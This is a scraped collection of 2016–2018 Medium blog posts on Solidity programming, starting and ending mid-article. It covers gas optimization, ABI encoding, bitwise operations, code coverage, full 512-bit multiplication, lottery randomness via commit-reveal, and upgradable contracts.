with optimization enabled, the first doBad() function call consumes ~60,000 Gas for its execution while doGood() only consumes ~40,000 Gas. Notice one word difference (20,000 Gas) because Good struct packs two uint128 into a single word.`doBad` function call costs 60709 Gas for its execution`doGood` function call costs 40493 Gas for its executionOnly Store Merkle Root as the StateA more extreme approach to mitigate state bloat is to store just a 32-byte Merkle Root on the blockchain. A transaction\u2019s caller is responsible to provide appropriate values and proofs for any data that the transaction needs to use during its execution. Smart contracts can verify that the proof is correct, but do not need to store any of that information persistently on-chain \u2014 only one 32-byte root is required to be kept and updated.Potentially Unbounded IterationsBeing a Turing complete language, Solidity allows potentially unbounded loops to be executed. For instance, a function that does something for every user can consume prohibitively huge amount of gas if the set of users has no apparent size limit. Avoiding unbounded loop will make gas cost more manageable. Here are some tricks you can utilize to improve your smart contracts.Off-Chain Computation (Hint)Naive implementations of common data structures like sorted list require an iteration through the whole collection to find the proper location when adding an element to the list to make sure it is still sorted. A more efficient approach would be to have the contract require an off-chain computation to provide it the exact location of the element to add. On-chain computation only needs to verify that all the invariants are preserved (i.e. that the added value ranks between its adjacent elements), which can prevent the cost from growing linearly with the total size of the data structure. See B9lab\u2019s article for a more thorough list of examples.Left: Looping through a list on-chain costs O(n) gas, which scales linearly as the list grows. Right: Computing location off-chain and verifying the value on-chain costs constant amount of gas regardless of the list\u2019s size.Use Withdrawal PatternsInstead of looping though and performing action on every single address under one transaction, a smart contract can keep a mapping whether each user has perform that action. Each user is responsible for sending a transaction to initiate the action, while the smart contract only verifies that no duplicated actions from the same user get executed. With this scheme, each transaction\u2019s cost stays constant in runtime complexity and does grow with the total number of users. This eliminates the possibility of going beyond gas limit in one transaction. However, it\u2019s important to note that the total overall number of gas cost will be more than just doing everything in one transaction.Left: Invoking one `Distribute` action costs gas proportional to number of receivers in one transaction, which can fail given a large enough number of users. Right: All transactions (1 `Add` and 4 `Claim`) do not have costs that scale with the number of users.ConclusionIn this article, we cover a few of Solidity programming patterns that can lead to expensive transaction fees, or worse, un-executable smart contract due to insufficient block gas limit. This is by no means an exhaustive list, but it should give you an idea of how to optimize you contracts. In the next articles, we will start to get our hands dirty and implement some real smart contracts or libraries with Solidity. Stay tuned!Band Protocol is a platform for decentralized data governance. We are a team of engineers who look forward to the future where smart contracts can connect to real-world data efficiently without trusted parties. If you are a passionate developer and want to contribute to Band Protocol, please reach out to us at talent@bandprotocol.com.", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain", "Solidity 102"]}, {"title": "What are ABI encoding functions in Solidity 0.4.24?", "post_link": "https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8?source=search_post", "author_name": "libertylocked", "author_link": "https://medium.com/@libertylocked", "publish_date": "2018-06-19", "last_modified_date": "2018-06-19", "readtime": "2.34", "claps": 580, "voters": 75, "content": "What are ABI encoding functions in Solidity 0.4.24?libertylockedFollowJun 19, 2018 \u00b7 3 min readSolidity 0.4.24 added a bunch of ABI encoding functions. Copied from Solidity docs, they are\u2026abi.encode(...) returns (bytes): ABI-encodes the given argumentsabi.encodePacked(...) returns (bytes): Performes packed encoding of the given argumentsabi.encodeWithSelector(bytes4 selector, ...) returns (bytes): ABI-encodes the given arguments starting from the second and prepends the given four-byte selectorabi.encodeWithSignature(string signature, ...) returns (bytes): Equivalent to abi.encodeWithSelector(bytes4(keccak256(signature), ...)Really the interesting functions here are encode and encodePacked, since the other 2 kind of just calls encodeThose functions are useful if you call functions dynamically.abi.encodeStarting with a simple example. If you just encode a single string like,abi.encode(\"AAAA\");You get the following output (96 bytes, 3 words)0x00000000000000000000000000000000000000000000000000000000000000200x00000000000000000000000000000000000000000000000000000000000000040x4141414100000000000000000000000000000000000000000000000000000000The 1st word is 0x20 (32 in decimal) padded to 32 bytes. This indicates the starting offset of the first and only parameter.The 2nd word is 0x04 padded to 32 bytes. This indicates the length of our string.Finally the 3rd word is our data, \u201cAAAA\u201d, UTF-8 encoded, padded to 32 bytes.Now let\u2019s try encoding two strings,abi.encode(\"AAAA\", \"BBBB\");It produces the following output (192 bytes, 6 words)0x00000000000000000000000000000000000000000000000000000000000000400x00000000000000000000000000000000000000000000000000000000000000800x00000000000000000000000000000000000000000000000000000000000000040x41414141000000000000000000000000000000000000000000000000000000000x00000000000000000000000000000000000000000000000000000000000000040x4242424200000000000000000000000000000000000000000000000000000000The 1st word is 0x40 (64 in decimal), indicating the starting offset of the first parameter.The 2nd word is 0x80 (128 in decimal), indicating the starting offset of the second parameter.The 3rd word is 0x04, which is the length of the first string.The 4th word is \u201cAAAA\u201dThe 5th word is 0x04, which is the length of the second string.The last word is \u201cBBBB\u201dYou can even go fancier and encode some arrays.uint8[3] memory arr = [0x1, 0x2, 0x42];abi.encode(arr, \"AAAA\", \"BBBB\");The result is 9 words.0x00000000000000000000000000000000000000000000000000000000000000010x00000000000000000000000000000000000000000000000000000000000000020x00000000000000000000000000000000000000000000000000000000000000420x00000000000000000000000000000000000000000000000000000000000000a00x00000000000000000000000000000000000000000000000000000000000000e00x00000000000000000000000000000000000000000000000000000000000000040x41414141000000000000000000000000000000000000000000000000000000000x00000000000000000000000000000000000000000000000000000000000000040x4242424200000000000000000000000000000000000000000000000000000000Because the array is fixed-length, The 3 elements in the array are simply laid out in the first 3 words.The 4th word is the offset for \u201cAAAA\u201d (160 in decimal, meaning the start of the data is at the 6th word)The 5th word is the offset for \u201cBBBB\u201d (224 in decimal, meaning the start of the data is at the 8th word)The 6th word is the length of \u201cAAAA\u201dThe 7th word is \u201cAAAA\u201dThe 8th word is the length of \u201cBBBB\u201dThe 9th word is \u201cBBBB\u201dabi.encodePackedEncode packed is simpler (although non-standard) than encode. Dynamic types are encoded in-place without length. Static types will not be padded if they are shorter than 32 bytes.Packed encode a single stringabi.encodePacked(\"AAAA\");Simply produces 0x41414141, which is exactly the same as just simply converting it to bytes.Encoding some uint with stringabi.encodePacked(uint8(0x42), uint256(0x1337), \"AAAA\", \"BBBB\");The output is0x420x00000000000000000000000000000000000000000000000000000000000013370x414141410x42424242Interestingly, arrays don\u2019t necessarily have their elements packed.uint8[3] memory arr = [0x1, 0x2, 0x42];abi.encodePacked(arr, \"AAAA\", \"BBBB\");The output is0x00000000000000000000000000000000000000000000000000000000000000010x00000000000000000000000000000000000000000000000000000000000000020x00000000000000000000000000000000000000000000000000000000000000420x414141410x42424242So the uint8 array elements are still padded to 32-byte words.keccak256 encoding behaviorBefore ABI encoding functions were introduced, keccak function accepts multiple arguments likekeccak256(\"AAAA\", \"BBBB\", 42);It has been implicitly doing encodePacked. But now if you try calling keccak with those, you are likely to get a compiler warning.This function only accepts a single \"bytes\" argumentSo it is no longer recommended to let compiler work its magic and implicitly encode the parameters to bytes. It gives the programmer more control of how the data should be encoded, packed or not.If you want the same behavior as before, you can try encodePacked, or convert the data to bytes yourself. For string, it can be directly converted to bytes like bytes(myString). For anything else, explicit packing may be needed.", "responses": 1, "tags": ["Programming", "Solidity", "Ethereum"]}, {"title": "Bitwise Operations and Bit Manipulation in Solidity, Ethereum", "post_link": "https://medium.com/@imolfar/bitwise-operations-and-bit-manipulation-in-solidity-ethereum-1751f3d2e216?source=search_post", "author_name": "Maksym", "author_link": "https://medium.com/@imolfar", "publish_date": "2016-10-27", "last_modified_date": "2018-06-05", "readtime": "5.25", "claps": 398, "voters": 70, "content": "Bitwise Operations and Bit Manipulation in Solidity, EthereumMaksymFollowOct 27, 2016 \u00b7 6 min readYes, Ethereum is the world\u2019s computer, though probably the most expensive one. Since storage is the largest gas-consuming operation, occasionally it is reasonable to dig down to the level of bits. Same as Assembly coder would do while programming firmware of a microchip. This will allow to get more control over your data and ultimately reduce transaction cost.Smart contract language Solidity supports basic bitwise operations, though some of them are missing (like left/right shift). Luckily there\u2019s arithmetic equivalents.The purpose of the article is to give you fundamental primitives for bit manipulation which can be used in more complex constructions.All bitwise operations are executed bit by bit, same way you would compare elements of two different arrays at the same index. Note: 0 and 1 have the same meaning as false and true and vice-versa.For simplicity I\u2019ll gonna use bytes1 data type (equal to byte), though same will apply to larger datatypes. Lets use same a and b variables for all examples:We use hex representation to initialize them in Solidity:bytes1 a = 0xb5; //  [10110101]bytes1 b = 0x56; //  [01010110]ANDBoth bits must be 1s to result in true.(Inputs have white background and result is highlighted by yellow one)a & b; // Result: 0x14  [00010100]ORAt least one of the bits have to be 1 (true).a | b; // Result: 0xf7  [11110111]XORCan be described as a difference between two inputs. One of the inputs have to be 1 and the other one must be 0 to result in true. Simply a[i] != b[i]. XOR operation often applied in cryptographic algorithms.a ^ b; // Result: 0xe3  [11100011]Interesting property is that if you want to know what was the value of original b, just XOR result with a. In one sense a is the key to unlock b.0xe3 ^ a; // Result: 0x56 == b  [01010110]NegationNegation, an inversion operation usually associated with the character \u201c~\u201d. Zero becomes one, one becomes zero.Solidity doesn\u2019t have support for negate operation. Luckily negation is the same as to XOR input with all 1s.a ^ 0xff; // Result: 0x4a  [01001010]Bit ShiftSince there\u2019s no bit shift functionality in Solidity we can use arithmetics to do the same thing. I\u2019m going to use decimal number to show the concept.What shift basically means is that I want to move some digits N positions to the left or to the right.Take for example 1230 (zeros prefixed for illustration purposes):00001230If we want to shift this number to the left by 3 positions we expect result to be:01230000Which in other words just means to multiply by 10, 3 times (10\u00b3).And if we want to shift to the right by 4 positions it\u2019s the same as to divide 4 times by 10 (10\u2074):00000123Same applies to binary, though instead of 10 digits (0 \u2013 9) there\u2019s only 2 (0, 1). Henceforth we multiply or divide by 2.Note: If you need to manipulate more than bytes32 at a time, slight modifications are necessary to use shift operations.Left ShiftShift a 3 bits leftvar n = 3; var aInt = uint8(a); // Converting bytes1 into 8 bit integervar shifted = aInt * 2 ** n;bytes1(shifted);     // Back to bytes. Result: 0xa8  [10101000]Right ShiftShift a 2 bits rightvar n = 2; var aInt = uint8(a); // Converting bytes1 into 8 bit integervar shifted = aInt / 2 ** n;bytes1(shifted);     // Back to bytes. Result: 0x2d  [00101101]Get First N BitsWe can create a mask of needed count of 1s in order to filter the part we\u2019re looking for by applying AND operation. For first 5 bits:var n = 5;var nOnes = bytes1(2 ** n - 1); // Creates 5 1svar mask = shiftLeft(nOnes, 8 - n); // Shift left by 3 positionsa & mask; // Result: 0xb0  [10110000]Note: var nOnes = 0xff; will work the same wayGet Last N BitsThere\u2019s arithmetic way to get last N bits. We can achieve that using modulo. For example if want to get last 2 digits from 10345, we can easily do it by dividing by 100 (10\u00b2) and getting remainder.10345 % 10 ** 2 = 45Same with binary, though this time we\u2019re getting modulo of multiples of 2. For example to get last 5 bits:var n = 5;var lastBits = uint8(a) % 2 ** n;bytes1(lastBits); // Result: 0x15  [00010101]Data Packing Use CaseLets say you have two 4-bit values c and d that you want to pack into one 8-bit value.Here\u2019s how you can do it:bytes1 c = 0x0d;bytes1 d = 0x07;var result = shiftLeft(c, 4) | d; // 0xd7 [11010111]c takes first 4 bits and d takes remaining 4 bits, can be other way around.Primitives Source Codecontract BitsAndPieces {        function and(bytes1 a, bytes1 b) returns (bytes1) {        return a & b;    }        function or(bytes1 a, bytes1 b) returns (bytes1) {        return a | b;    }        function xor(bytes1 a, bytes1 b) returns (bytes1) {        return a ^ b;    }        function negate(bytes1 a) returns (bytes1) {        return a ^ allOnes();    }        function shiftLeft(bytes1 a, uint8 n) returns (bytes1) {        var shifted = uint8(a) * 2 ** n;        return bytes1(shifted);    }        function shiftRight(bytes1 a, uint8 n) returns (bytes1) {        var shifted = uint8(a) / 2 ** n;        return bytes1(shifted);    }        function getFirstN(bytes1 a, uint8 n) returns (bytes1) {        var nOnes = bytes1(2 ** n - 1);        var mask = shiftLeft(nOnes, 8 - n); // Total 8 bits        return a & mask;    }         function getLastN(bytes1 a, uint8 n) returns (bytes1) {        var lastN = uint8(a) % 2 ** n;        return bytes1(lastN);    }         // Sets all bits to 1    function allOnes() returns (bytes1) {        return bytes1(-1); // 0 - 1, since data type is unsigned, this results in all 1s.    }        // Get bit value at position    function getBit(bytes1 a, uint8 n) returns (bool) {        return a & shiftLeft(0x01, n) != 0;    }        // Set bit value at position    function setBit(bytes1 a, uint8 n) returns (bytes1) {        return a | shiftLeft(0x01, n);    }        // Set the bit into state \"false\"    function clearBit(bytes1 a, uint8 n) returns (bytes1) {        bytes1 mask = negate(shiftLeft(0x01, n));        return a & mask;    }    }", "responses": 2, "tags": ["Ethereum", "Solidity", "Bitwise", "Bitcoin", "Blockchain"]}, {"title": "Code Coverage for Solidity", "post_link": "https://medium.com/colony/code-coverage-for-solidity-eecfa88668c2?source=search_post", "author_name": "Alex Rea", "author_link": "https://medium.com/@area", "publish_date": "2016-10-03", "last_modified_date": "2018-06-11", "readtime": "6.27", "claps": 462, "voters": 71, "content": "Code Coverage for SolidityAlex ReaFollowOct 3, 2016 \u00b7 7 min readEnsuring the security of deployed Ethereum contracts is one of the most important challenges facing Ethereum developers today. After the unfortunate problems with the DAO, the resulting hard fork and associated community fallout, hopefully no-one reading this article would disagree. Indeed, there was a whole session devoted to the topic at the recent DevCon2, with talks spanning formal verification, coding best practices and more. However, the Ethereum community seems to have been silent regarding one of the first tools invented to help avoid unintended behaviour from code \u2014 code coverage.Code coverage, first devised in the 1960s, encapsulates the idea that tests should \u2018touch\u2019 all of the code under test. If the tests execute all of your code, and the results from the tests are as expected, it is less likely your code contains unforeseen bugs. Untested code could do anything!I will freely admit this is not a silver bullet. Writing tests achieving even 100% code coverage would not have caught the reentrancy bug that was the fatal flaw in the DAO unless someone had written a particularly inspired test. Indeed, blindly writing tests to achieve 100% coverage is probably not the best use of a developer\u2019s time. Code coverage should only be treated as another arrow in our collective quiver.ResultsI have written a tool called SolCover. It uses Istanbul (see later) to generate the reports themselves. The HTML report is probably the easiest for users to interpret:Snippet from some code coverage results.The numbers in the margin indicate each line here is run 17 times during the tests. Which seems good! But we need to look deeper. The black block containing a yellow \u2018I\u2019 tells us the \u2018if\u2019 statement never evaluated to true in any of the tests, and this is also shown by \u2018throw\u2019 being highlighted in red, which indicates that statement is never executed. Perhaps this is an oversight in the testing, and a user with the wrong permissions is just never used. But perhaps the \u2018userIsInRole\u2019 function has a bug, and only ever returns \u2018true\u2019, and this represents a security hole? The only way to know is to write a test that should trigger that branch\u2026If you are not interested in methodology used, and just want to use SolCover, you can get it from GitHub, where the usage instructions can be found too, but be aware that is probably still extremely fragile at the moment. Otherwise, carry on for an overview of the general method and then some nitty-gritty details.ImplementationThis was only as easy to put together as it was because of the excellent tools that already exist, both in Ethereum and the wider community. Istanbul is used throughout the Javascript community for code coverage, and is well supported and documented. It generates a coverage.json file, which is then interpreted in conjunction with the source files to make the coverage report. My script generates the coverage.json file independent of Istanbul, but in the expected format, and just uses Istanbul to generate the reports after the fact.For the testing itself, it is assumed Truffle is being used, as this is what we\u2019re using at Colony. This is a great testing framework that uses the Javascript frameworks Mocha and Chai for running and writing the tests and makes it very easy to start writing tests. Indeed, it expects it of you, with the demo project created with the \u2018truffle init\u2019 command pointedly containing a \u2018test\u2019 directory.How does SolCover know which lines or statements have been run? By changing the source code through a process called instrumentation, which is how most coverage tools work. Before every line or statement of interest, a call to emit an event is inserted that indicates the immediately following piece of code has been run. These events are then interpreted alongside the source files to generate the \u2018coverage.json\u2019 file, which is used to generate the report itself.The instrumentation is done by parsing the contracts with SolParse, and then based on the statements there, altering the contract appropriately. There were technical issues surrounding injecting these alterations to the contract, however, some of which are described in the \u2018instrumentation notes and difficulties\u2019 section below.In the context of Ethereum, a large amount of instrumentation on an already large contract requires increasing the block size limit so the modified contract can be deployed. This is trivial to do when using TestRPC (requiring only a command line flag), which SolCover uses when running the tests. However, it does also require modification of a project\u2019s truffle.js due to the increased contract size, and therefore deployment costs.Instrumentation notes and difficultiesModifersModifier definitions are treated exactly the same as function definitions, and are therefore counted in the \u2018function coverage\u2019 metric.The ternary operatorThe ternary operator is an incredibly useful tool, which allows concise code to be written without sprawling \u2018if\u2019 statements. A simple use of it looks like:This snippet sets \u2018x\u2019 to either 1 or 2, depending on whether y is equal to z or not. We wish to instrument it and so be able to track whether the statement has resolved to both false and true during our tests. In Javascript, Istanbul would instrument this code in the following way:The comma operator is used here to change the underlying code as little as possible. Unfortunately, the comma operator does not exist in solidity at the statement level (which is certainly confusing to me). To instrument this code successfully, we have to modify it more than I would like:This abuses the fact that on the left hand side of an assignment operator, a tuple is allowed to have empty elements. This works, and is probably the best we can achieve here without the comma operator as a first-class citizen..call() and throwIn Ethereum, functions in a contract can be called locally, which means they do not actually cause changes to the blockchain. They are executed, usually to read a value or estimate gas costs for a transaction, and then reverted without the transaction being broadcast to the network. Unfortunately, this means if we relied on a filter \u2014 which is the usual way to access events \u2014 these events would be invisible to us, and would not be seen by our coverage.Similarly, if a transaction fails due to a throw statement being hit, while a transaction is created all changes are reverted (other than all gas sent with the transaction being taken). This includes events. That means ordinarily, our test coverage would not be able to tell us when our contracts threw \u2014 which we should certainly be making sure they do at appropriate points.To get around these problems, I modified ethereumjs-vm to log all events as they were executed on the VM to a separate file. Even when the changes due to a transaction are reverted, this file logs the event occurred, however quickly it was reverted. This allows us to track coverage even in these cases, and get a true idea of our test coverage.Invisible else branchesRather than explain the subtlety here, I will just link to an excellent blogpost discussing the importance of branch coverage as well as line coverage, before noting we also have to transform \u2018if\u2019 statements in nonintuitive ways. If we have the very reasonable looking code:This needs to be transformed to track if all possible branches have been tried. The transformation used is again more invasive than I would like, but works.Other caveatsIt is entirely possible that when running SolCover, your tests will fail if they test or rely on properties of your contracts related to how much gas they use. This is because the instrumentation process significantly increases the cost for a deployment (up to ~4 times), as well as the cost of function calls due to the extra events. I have already made the gas cost for EVM\u2019s LOG call zero to help this, but further work should probably be done on this front. Given that this tool already uses its own modified TestRPC , this is easy implement with few other side effects.ConclusionThis only really rates as a first stab at a coverage tool. Some types of statements could easily be instrumented incorrectly, or have been overlooked in this implementation. Eagle-eyed developers will note \u2014 presumably with a wry grin \u2014 that there are very few tests in the repository! Issues describing problems users encounter are of course welcome at GitHub, especially if they are accompanied by pull requests!About the authorAlex considers himself a recovering astrophysicist. After completing his Ph.D. at Cambridge, he decided academia wasn\u2019t all it was cracked up to be, and started working for Colony. As a cofounder, he does whatever needs doing, but is happiest when faced with a screen full of code.Alex can be found on Github, Twitter and probably anywhere the username \u2018area\u2019 is used.To keep up to date on the development of Colony, you can find us on Twitter, or sign up for our (infrequent!) newsletter on our website.", "responses": 1, "tags": ["Testing", "Solidity", "Code Coverage", "Ethereum"]}, {"title": "Mathemagic: Full Multiplication", "post_link": "https://medium.com/wicketh/mathemagic-full-multiply-27650fec525d?source=search_post", "author_name": "Remco Bloemen", "author_link": "https://medium.com/@recmo", "publish_date": "2017-12-15", "last_modified_date": "2018-06-20", "readtime": "4.99", "claps": 510, "voters": 70, "content": "Mathemagic: Full MultiplicationRemco BloemenFollowDec 15, 2017 \u00b7 5 min readA lot of smart contracts use the SafeMath library. It prevents contracts from having incorrect results, but it does so by failing transactions instead of making them correct. Let\u2019s instead try to do the math correctly. In this series, I will derive some advanced techniques. Today, I\u2019ll make a better safeMul.If you multiply two numbers, the result will be a number twice the size. In Ethereum, when you multiply two numbers, the result can be up to 512 bits. But Ethereum only gives you the lower half; it simply ignores the rest. This is a common practice in mathematics called modular arithmetic.However, ignoring numbers is not an acceptable practice in accounting. Care needs to be taken to avoid it or someone will lose something valuable. A popular library called SafeMath detects when it happens and then fails the transaction. But what if you do not want your transaction to fail?What if you want to multiply any numbers and have the complete result?Spoiler alert: this is snippet of Solidity code will do that for you:Optimized full 512 bit multiplication in Solidity.But before we get into that, let\u2019s define the problem precisely: We have two unsigned numbers a and b, both 256 bits in length and we want their product, a 512-bit number x.Since this number is too large to be represented directly in code, we split it up into the least significant and most significant 256 bits, r\u2080 and r\u2081 respectively:Where the square brackets with subscript represent the modulo operation and the lower-half brackets on the right represent the floor operation.Schoolbook algorithmThe classical way of solving this problem is by long multiplication, the method we all learned in school. You split your large number into decimals, multiply the digits, and then add the intermediate results. This method also works in binary and other bases. Let me quickly show you how you would use it here:Since we have 256 bit multiply build in, we can multiply any two 128 bit numbers and get the full result. So if we split our large number into groups of 128 bits we can compute all their products. Take a\u2080 and a\u2081 to respectively mean the least significant and most significant 128 bits of a, similarly for b:Now the original numbers a and b can be written as:If we substitute this in product equation it becomes:Ignoring the constants, we now have four multiplications instead of one. But all four of them involve numbers less than 2\u00b9\u00b2\u2078 that can be computed directly. The result is still too large, so we still need two numbers r\u2080 and r\u2081 to represent it. I will skip the steps of how to get r\u2080 and r\u2081 from this expression. It is straightforward, but annoying because of the shifts and carries. The final result is:Schoolbook algorithm for 512 bit multiplication.(Note that Solidity, as of 0.4.18, actually fails to compile the above example because the compiler can not handle that many local variables. This is easily solved by inlining some expressions, but since it reduces readability I opted not to do that for this example.)The two multiplications for i01 and i10 can be replaced by one using the Karatsuba algorithm, at the expense of a few more additions. Since additions are 3 gas and multiplications only 5, this is not worth it. But if you want to do larger multiplications (say 4096 bit) it is worth looking into these methods.We have now solved the problem using two modulo operations, four divisions, six additions, two conditional branches, and no less than six multiplications. The entire function takes a bit over 300 gas. This is not bad, but the gas cost is almost two orders of magnitude larger than the 5 gas for a regular multiplication, or 90 for a standard safeMul.We can do a lot better.Chinese RemainderSo here\u2019s the trick: We use the rather obscure mulmod instruction and the Chinese Remainder Theorem. In short, the theorem states thati f we know a number modulo 2\u00b2\u2075\u2076 and 2\u00b2\u2075\u2076 \u2014 1, we can compute its 512-bit representation cheaply. The function to do this, chineseRemainder, is described in a previous post. To use it here, we first need to compute our product in the two moduli:The first one, x\u2080 is just a regular multiply, as it already truncates to 256 bits. The second one, x\u2081, can be computed directly using a single mulmod operation. This is a rather unknown opcode that computes:Put this together, and we have our new mul512 function:512-bit multiplication.The Solidity compiler, as of version 0.4.18, does not produce very optimal code here. The chineseRemainder function is so tiny it is not worth the call-overhead, so it should be inlined, but the compiler doesn\u2019t do this. The compiler does recognize that M1 can be expressed efficiently as not(0). Manually inlining results in an efficient multiplication function:Optimized full 512 bit multiplication in Solidity.It is our chineseRemainder function (two subs and one lt) with a mul and mulmod added. We use assembly to avoid an unnecessary branch. The total gas cost is about 60 gas, compared to 5 for a normal multiply and 90 for a standard safeMul. In fact, it is slightly cheaper to use mul512 and check that r1 is zero than it is to use safeMul!ConclusionIt is possible to do full precision never-overflowing multiplication in the EVM for less gas than a regular safeMul. This is a good starting point for smart contracts do not want to reject transaction just because an intermediate value overflows.In the next post, I will introduce a number of simple utility functions for dealing with large numbers. This builds up to a very popular function that nobody has yet implement correctly for all cases. Stay tuned!If you enjoy these posts and/or want to encourage me to write more, please clap & follow!", "responses": 1, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Mathematics", "Blockchain"]}, {"title": "Lottery Smart Contract: Can we generate random numbers in Solidity?", "post_link": "https://medium.com/@promentol/lottery-smart-contract-can-we-generate-random-numbers-in-solidity-4f586a152b27?source=search_post", "author_name": "Narek Hovsepyan", "author_link": "https://medium.com/@promentol", "publish_date": "2018-02-10", "last_modified_date": "2018-06-20", "readtime": "4.53", "claps": 419, "voters": 69, "content": "Lottery Smart Contract: Can we generate random numbers in Solidity?Narek HovsepyanFollowFeb 10, 2018 \u00b7 5 min readImagine we are building a decentralized Lottery. What challanges does it have? Ever thought about is that even possible? In this article we are going to explore the possibile approaches for building a Smart Contract for decentralized lottery.History of Lottery.The earliest mention of lottery games is in China, during Han dynasty, a game called keno, which you can still find in many Casinos in Asia. The idea of the lottery is simple. The organizer is collecting the money from players, and a randomly selected subset of players, called winners, are getting rewarded, while others are loosing their money. The organizer usually is distributing one part of all collected money, which is putting him on always profiting position. French King Francis I used lottery to get money to state budget and help state budget. Countries like Thailand or Russia, are allowing only state issued lotteries, while other countries like Goergia you can register lottery company within minutes.What is Lottery?Well, everybody knows what is lottery. At least if you are reading this articles, you know what is lottery. I am asking to question, to go further and define the task we will solve in this article.Design a Smart Contract, which accept a single number from users, after getting payed for 0.1 eth, add a pool of users. At some point stop allowing submissions of new user, then select a random number, distribute half of collected funds between users, who have submitted the selected number.Why It is difficult?Here are two challanges we will face in order to develop Smart Contract for a lottery.How we will generate random number? In Solidity, the code should be deterministic, as it will run on multiple nodes. Things like clock time are not available for generating random number.How does Smart Contract know the time for selecting the winner? Again things like clock time are not available in Ethereum Virtual Machine, as the code will be ran on multiple nodes, on different time.The second challange can be solved using Ethereum Alarm. The blocknumber can be an alternative in a clock time, as it is always increasing by 1. As I want to focus on the first challage, in our smart contract We will make a public function which will trigger the winner(s) selection process. This can be triggered either by owner of smart contract, or by Ethereum alarm, or in any other way.Generating (Pseudo)Random number in SolidityWe need a random number generator, which will generate the same number on multiple nodes, running multiple times. This is nonsense for anyone who knows what means random number. Then how we can accomplish that task? We need a random number generated once, and use that on different nodes. Well Solidity code will ran the code on multiple nodes, multiple times, but there is one running process which makes it unique among all the runs of the code. Yes it is the time when the code will be ran by miner, who will confirm the transaction. Let\u2019s take a look to the block variable , which is assigned by miner to every confirmed smart contract. If we will look to block.timestamp constant, it is assigned by miner, no player have control on it. After it will be generated and assigned, it will be the same for all other nodes which will ran the Solidity code. block.difficulty also has some properties of randomness. Basically those two variables are completely out of control of the players, thus they can be used as a source for random number. They are generated only once by miner, and on all other nodes it will have the same value, thus random number will be generated on multiple nodes will be the same.Sounds legit enough right? let\u2019s look the Solidity code snippet for a lottery, everything should be self explaining. Note that in this code I have ignored gas limits, as this code is for demonstration of random number generation only.random() function is determined block\u2019s parametersLet\u2019s explain the random() function. It depends on block.difficulty and block.timestamp, it is being hashed and encoded as a number. After encoding 256 bit hash to 256 bit integer, we are taking reminder by dividing 251, to get an integer in a range from [0, 250]. In our case 251 is prime number, whic is good. You are free to use any hash function Solidity is providing. But Why Hashing? All you need is just an operation which will convert given constants into fixed length bits. Hashing is not important here, as it is only incapsulating initial values, which is not giving us anything, as initial values they are available for any blockchain explorer.But wait? can we trust miners?The answer is NO!More good solution?A question was asked on stackoverflow about how lottery can be implemented in Solidity. A user Tjaden Hess has suggested wonderfull solution. Am implementation bellow is heavily based on his algorithm. We have simplified a little bit, also modified as our definition of the task was slightly different.The paradigm is simple. As a source of randomness, there can be used adresses of players, or their numbers, as their distributions are completely random. We need also to hide those values for other players, in order to prevent attacks. We can not hide adresses of players, as they are recorded in the blockchain. So we need relay only on numbers submitted by our players. We may need from them to submit their hashes instead of numbers.Let\u2019s describe algorithm of the lottery smart contract bellowThe organizer is starting to accept submissionsUser is generating their number, which they want to submitUser is hashing it\u2019s number alongside with their addressUser submits that hash only, instead of numberAt some point, ether by block number, or by the organizer, or when sufficient players are here, the contract is stopping to accept new submissions.Contract is opening new round of submissions. Now users who have previously submitted a hash, are required to submit the original number. Only users who have submitted before a hash can submit original value. Note that two rounds were created, in order to hide user\u2019s numbers from other users, as we don\u2019t want them to know the source of randomness.When the user is submitting original number, the contract is verifying it by adding it to the address of sender, hashing and comparing with previouslyContract is stopping to accept new submissions.As we have list of original numbers, we can use them to generate final number. One possible solution is to XOR all numbers. You are free to do some creativity here.The half of the funds collected by the users are being split between users who have submitted number.Bellow is an implementation of such lottery.random() function is XOR-ing all numbersThis idea of collecting hashes, then numbers, then generating pseudorandom number based on them, are used and implemented in Randao, think like a DAO for generating random number. I strongly encourage to go further to their documents.Wrap UpThank you for reading, if you enjoyed the material follow me on medium, and look to my other articles. Thanks!", "responses": 5, "tags": ["Ethereum", "Random", "Solidity"]}, {"title": "Upgradable Contracts in Solidity", "post_link": "https://medium.com/cardstack/upgradable-contracts-in-solidity-d5af87f0f913?source=search_post", "author_name": "Hassan Abdel-Rahman", "author_link": "https://medium.com/@habdelra", "publish_date": "2018-01-19", "last_modified_date": "2018-08-29", "readtime": "7.84", "claps": 914, "voters": 66, "content": "Upgradable Contracts in SoliditySolving the riddle of how to improve immutable Ethereum codeHassan Abdel-RahmanFollowJan 19, 2018 \u00b7 8 min readAt Cardstack we are building an application framework that will enable developers to create and host dApps that put user experience first. As part of this effort we\u2019re creating an extensible and future-proof token to power our framework. Enter: Upgradable Contracts.So why are upgradable contracts important? Requirements change, the market changes, the world becomes more complex, entropy increases \u2014 software, much like biology, is in a constant state of flux. The most successful software is the software that adapts best to a changing world. A smart contract isn\u2019t so smart if it can\u2019t evolve over time.We\u2019ve found a way to solve this crucial problem.The core of the approach that we have taken at Cardstack was greatly influenced by Elena Dimitrova\u2019s blog post on how Colony builds upgradable contracts. Specifically, the most important thing to consider when upgrading contracts is how to preserve the state of the original contract in the upgraded contract. In a classic software engineering approach, Elena describes how the state of the contract can be separated from the functionality of the contract. This approach allows multiple contracts to share the same state.When we built upon this approach, we added an additional component to the solution: a \u201cregistry contract\u201d. The registry contract performs the bookkeeping necessary to keep track of the shared contract state, keep track of the different versions of each contract, and to bind and unbind the shared state to contracts as new versions of the contracts are added to the network. Furthermore, the registry contract acts as a bridge between the Ethereum Name Service (ENS) and the latest version of our contracts.StorageFirst, let\u2019s talk a little more about how we are handling the contract state. As in the approach described in Elena\u2019s post, we have created a \u201cstorage contract\u201d that basically acts a bucket, carrying the state from one version of our contract to the next. In this storage contract, we can accommodate many different types of data in a name-value store. We have also created a \u201cledger contract\u201d, as in the Colony approach, a specialized form of a storage contract designed specifically for ledgers. However, in our storage contract we\u2019ve created a map of ledgers you can use in place of the \u201cledger contract\u201d, which we\u2019ll most likely end up doing in the future.ExternalStorage.solThe ExternalStorage.sol is our \u201cstorage contract\u201d. In it you can see we provide slots for storing all types of data, including more complex structures like actual ledgers, and even \u201cmulti-ledgers\u201d (a word I just invented), which is a map of ledgers. This is what we use to store the allowances for the transferFrom() ERC20 function of our contract. For each type, we have a record parameter which is the \u201ckey\u201d in our storage contract\u2019s key value store. In our token\u2019s library contract you can see how we set and get these values from our storage:snippet from 